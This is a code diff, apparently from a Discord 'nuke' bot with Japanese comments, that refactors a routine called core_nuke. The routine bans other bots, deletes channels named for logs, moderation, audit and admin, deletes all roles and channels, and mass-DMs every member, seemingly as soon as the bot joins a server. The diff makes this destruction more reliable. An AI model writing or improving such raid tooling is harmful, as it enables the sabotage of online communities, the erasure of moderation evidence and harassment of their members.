@@ -121,15 +121,18 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
 
-    # 並列スタート: 他のボットBAN + ログチャンネル削除 + ロール削除 + 絵文字/スタンプ削除 + コミュニティ/ウェルカム無効化
-    bot_ban_task = asyncio.create_task(asyncio.gather(*(limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot), return_exceptions=True))
+    # 並列スタート: 他のボットBAN
+    bot_ban_coros = [limited_global(guild.ban(m, reason="", delete_message_seconds=0)) for m in members if m.bot]
+    bot_ban_task = asyncio.create_task(asyncio.gather(*bot_ban_coros, return_exceptions=True)) if bot_ban_coros else None
 
+    # ログ系チャンネル削除
     log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
     channels = list(guild.channels)
     log_channels = [ch for ch in channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
-    log_delete_task = asyncio.create_task(asyncio.gather(*(limited_global(ch.delete()) for ch in log_channels), return_exceptions=True)) if log_channels else None
+    log_delete_coros = [limited_global(ch.delete()) for ch in log_channels]
+    log_delete_task = asyncio.create_task(asyncio.gather(*log_delete_coros, return_exceptions=True)) if log_delete_coros else None
 
-    # ロール削除タスク
+    # ロール削除タスク（並列）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
@@ -137,15 +140,15 @@ async def core_nuke(guild, new_server_name=None):
         async def delete_roles_batch(roles):
             await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
 
-        batch_size = 15  # 爆速化
+        batch_size = 15
         attempt = 0
         current_roles = roles_to_delete[:]
-        while len(current_roles) > 0 and attempt < 2:  # すぐ諦め
+        while len(current_roles) > 0 and attempt < 2:
             attempt += 1
             for i in range(0, len(current_roles), batch_size):
                 batch = current_roles[i:i+batch_size]
                 await delete_roles_batch(batch)
-                await asyncio.sleep(random.uniform(0.05, 0.1))  # 短く
+                await asyncio.sleep(random.uniform(0.05, 0.1))
 
             await asyncio.sleep(1)
             remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
@@ -173,17 +176,18 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 並列タスク待機
-    await bot_ban_task
+    # 並列待機
+    if bot_ban_task:
+        await bot_ban_task
     if log_delete_task:
         await log_delete_task
     await emoji_sticker_task
     await role_task
 
-    # DM送信（並列完了後）
+    # DM送信
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
-    # 残りチャンネル削除（爆速）
+    # チャンネル削除
     channels = list(guild.channels)
     print(f"チャンネル削除開始: 対象 {len(channels)}個")
 
@@ -285,6 +289,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print("完了")
 
+# イベントハンドラ（変更なし）
 @bot.event
 async def on_guild_join(guild):
     if guild.id == MANAGE_GUILD_ID:
